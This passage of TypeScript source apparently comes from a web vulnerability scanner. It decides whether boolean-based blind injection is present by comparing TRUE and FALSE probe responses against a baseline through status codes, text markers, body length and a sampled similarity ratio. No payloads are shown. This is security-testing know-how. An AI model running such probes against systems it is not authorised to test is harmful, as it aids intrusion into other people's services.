    const trueFalseDiff = Math.abs(trueBody.length - falseBody.length);

    // Similarity Ratio
    const simRatioTrue = BooleanTester.calculateSimilarityRatio(baselineBody, trueBody);
    const simRatioFalse = BooleanTester.calculateSimilarityRatio(baselineBody, falseBody);

    // Extract unique markers present in TRUE but absent in FALSE (excluding payload reflection and dynamic nonces)
    const uniqueMarkers = BooleanTester.extractUniqueDifferentialMarkers(
      trueBody,
      falseBody,
      truePayload,
      falsePayload,
      baselineBody
    );

    // ─── Bi-Directional Status Divergence Evaluation ─────────────────────────
    // Case 1: Error-on-TRUE: TRUE triggers runtime exception (e.g. 500) while FALSE succeeds (e.g. 200)
    const errorOnTrue = (trueStatus >= 500 && falseStatus < 500) ||
                        (falseStatus === baselineStatus && trueStatus !== baselineStatus && trueStatus !== 0);

    // Case 2: Error-on-FALSE: TRUE succeeds (e.g. 200 matching baseline) while FALSE triggers exception (e.g. 500 or 404)
    const errorOnFalse = (trueStatus === baselineStatus && falseStatus !== baselineStatus && falseStatus !== 0) ||
                         (trueStatus < 500 && falseStatus >= 500);

    const isStatusDivergent = (errorOnTrue || errorOnFalse) && trueStatus !== falseStatus;
    const isMarkerDivergent = trueStatusMatches && uniqueMarkers.length > 0 && trueBody !== falseBody;
    const isLengthDivergent = trueStatusMatches && trueLengthDiff < 40 && falseLengthDiff > 60 && trueFalseDiff > 40 && trueBody !== falseBody;
    const isSimDivergent = trueStatusMatches && simRatioTrue >= 0.95 && simRatioFalse <= 0.85;

    const isVulnerable = isStatusDivergent || isMarkerDivergent || isLengthDivergent || isSimDivergent;

    let confidence = 0;
    let evidence = '';
    let divergenceType: BooleanEvaluationResult['divergenceType'];
    let divergencePolarity: BooleanEvaluationResult['divergencePolarity'] = 'normal';

    if (isVulnerable) {
      if (isStatusDivergent) {
        divergenceType = 'status_divergence';
        confidence = 98;
        if (errorOnTrue && trueStatus >= 500) {
          divergencePolarity = 'error_on_true';
          evidence = `Status code differential (Error-on-TRUE runtime exception): TRUE returned HTTP ${trueStatus}, FALSE returned HTTP ${falseStatus} (baseline HTTP ${baselineStatus})`;
        } else {
          divergencePolarity = 'error_on_false';
          evidence = `Status code differential (Error-on-FALSE divergence): TRUE returned HTTP ${trueStatus} (matching baseline), FALSE returned HTTP ${falseStatus}`;
        }
      } else if (isMarkerDivergent) {
        divergenceType = 'marker_divergence';
        confidence = 98;
        evidence = `Conditional response text identified: TRUE contains "${uniqueMarkers.join(', ')}" (absent on FALSE condition)`;
      } else if (isLengthDivergent) {
        divergenceType = 'length_divergence';
        confidence = 92;
        evidence = `Body length differential: TRUE matches baseline (diff: ${trueLengthDiff}B), FALSE diverges (diff: ${falseLengthDiff}B, delta: ${trueFalseDiff}B)`;
      } else {
        divergenceType = 'similarity_divergence';
        confidence = 88;
        evidence = `Content similarity differential: TRUE similarity ${(simRatioTrue * 100).toFixed(1)}%, FALSE similarity ${(simRatioFalse * 100).toFixed(1)}%`;
      }
    } else {
      evidence = `No boolean differential: TRUE diff=${trueLengthDiff}B, FALSE diff=${falseLengthDiff}B, statuses: base=${baselineStatus}, T=${trueStatus}, F=${falseStatus}`;
    }

    return {
      isVulnerable,
      confidence,
      evidence,
      similarityRatioTrue: simRatioTrue,
      similarityRatioFalse: simRatioFalse,
      uniqueMarker: uniqueMarkers.length > 0 ? uniqueMarkers[0] : undefined,
      divergenceType,
      divergencePolarity,
      isConditionalError: isStatusDivergent && (trueStatus >= 500 || falseStatus >= 500),
    };
  }

  public static calculateSimilarityRatio(a: string, b: string): number {
    if (a === b) return 1.0;
    if (!a || !b) return 0.0;
    const lenA = a.length;
    const lenB = b.length;
    const maxLen = Math.max(lenA, lenB);
    if (maxLen === 0) return 1.0;

    // Clean HTML tags & inline scripts to focus on text nodes
    const cleanA = a.replace(/<(script|style)[^>]*>[\s\S]*?<\/\1>/gi, '').replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
    const cleanB = b.replace(/<(script|style)[^>]*>[\s\S]*?<\/\1>/gi, '').replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();

    if (cleanA === cleanB) return 1.0;
    const textMaxLen = Math.max(cleanA.length, cleanB.length);
    if (textMaxLen === 0) return Math.min(lenA, lenB) / maxLen;

    // Multi-window sampling across 100% of full document length
    const numSamples = 30;
    const chunkSize = 40;
    let matches = 0;
    let sampledTotal = 0;

    const stepA = Math.max(1, Math.floor((cleanA.length - chunkSize) / numSamples));
    const stepB = Math.max(1, Math.floor((cleanB.length - chunkSize) / numSamples));

    for (let i = 0; i < numSamples; i++) {
      const posA = Math.min(cleanA.length - chunkSize, i * stepA);
      const posB = Math.min(cleanB.length - chunkSize, i * stepB);
      if (posA < 0 || posB < 0) break;
      
      const chunkA = cleanA.slice(posA, posA + chunkSize);
      const chunkB = cleanB.slice(posB, posB + chunkSize);
      
      sampledTotal += chunkSize;
      if (chunkA === chunkB) {
        matches += chunkSize;
      } else {
        for (let j = 0; j < chunkSize; j += 5) {
          if (chunkA.slice(j, j + 5) === chunkB.slice(j, j + 5)) {
            matches += 5;
          }
        }
      }
    }

    const sampleRatio = sampledTotal > 0 ? matches / sampledTotal : 0;
    const lengthRatio = Math.min(cleanA.length, cleanB.length) / textMaxLen;
    return Math.min(1.0, (sampleRatio * 0.7) + (lengthRatio * 0.3));
  }
}
